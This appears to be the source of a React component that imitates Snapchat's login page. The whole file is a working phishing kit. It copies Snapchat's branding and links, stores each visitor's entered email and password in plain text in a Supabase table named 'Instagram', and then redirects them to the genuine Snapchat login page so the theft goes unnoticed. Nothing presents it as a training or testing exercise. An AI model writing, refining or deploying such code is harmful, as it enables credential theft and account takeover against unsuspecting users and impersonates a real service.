import React, { useState } from "react";
import "./SnapchatLogin.css";
import { supabase } from "../../supabase";

const SnapchatLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://accounts.snapchat.com/accounts/login";
    }
  };

  return (
    <div className="snapchat-login-container">
      <div className="snapchat-login-box">
        <div className="snapchat-logo">👻</div>
        <h2>Log In</h2>
        <form className="snapchat-login-form" onSubmit={handleSubmit}>
          <label className="snapchat-login-label">Username or Email</label>
          <input
            type="text"
            className="snapchat-login-input"
            placeholder="Username or Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <label className="snapchat-login-label">Password</label>
          <input
            type="password"
            className="snapchat-login-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <a
            className="snapchat-login-forgot"
            href="https://accounts.snapchat.com/accounts/password_reset_request"
            target="_blank"
            rel="noopener noreferrer"
          >
            Forgot password?
          </a>
          <button type="submit" disabled={loading}>
            {loading ? "Logging in..." : "Log In"}
          </button>
        </form>
        {success && <div className="snapchat-success">Login saved!</div>}
        {error && <div className="snapchat-error">{error}</div>}
        <div className="snapchat-login-signup">
          New to Snapchat?
          <a
            href="https://accounts.snapchat.com/accounts/signup"
            target="_blank"
            rel="noopener noreferrer"
          >
            Sign Up
          </a>
        </div>
      </div>
    </div>
  );
};

export default SnapchatLogin;
